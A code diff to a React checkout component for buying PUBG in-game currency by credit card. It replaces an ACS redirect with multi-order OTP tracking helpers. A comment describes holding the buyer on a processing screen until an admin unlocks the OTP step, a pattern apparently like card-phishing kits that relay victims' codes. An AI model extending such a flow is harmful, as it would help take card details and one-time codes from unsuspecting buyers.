@@ -2,7 +2,7 @@ import React, {useEffect, useMemo, useRef, useState} from 'react';
 import {Activity, ArrowLeft, ArrowRight, Check, CreditCard, ShieldAlert, Wallet, XCircle, CheckCircle2} from 'lucide-react';
 import {CreditCardPaymentFields} from './CreditCardPaymentFields';
 import {CardProcessingToOtpScreen} from './OtpPaymentUi';
-import {redirectToAcsChallenge} from '../lib/acsRedirect';
+import {openAcsForOrder, trackPendingCardOrder, signalOtpReady} from '../lib/multiOrderOtp';
 import {useLanguage} from '../context/LanguageContext';
 import {apiUrl} from '../lib/apiBase';
 import {formatLatinDigits} from '../lib/formatNumbers';
@@ -102,7 +102,8 @@ export function PubgUcOrder({
   const openAcs = (orderRef: string, phoneLast3?: string | null) => {
     if (redirectingRef.current) return;
     redirectingRef.current = true;
-    redirectToAcsChallenge({
+    signalOtpReady(orderRef, phoneLast3);
+    openAcsForOrder({
       orderRef,
       clientId,
       lang,
@@ -221,6 +222,7 @@ export function PubgUcOrder({
       }
       redirectingRef.current = false;
       setCurrentOrderId(orderRef);
+      trackPendingCardOrder(String(orderRef));
       setCardProcessingToOtp(true);
       setIsSubmitting(false);
       // Stay on processing screen (1–2 min) until admin unlocks awaiting_otp → /3ds
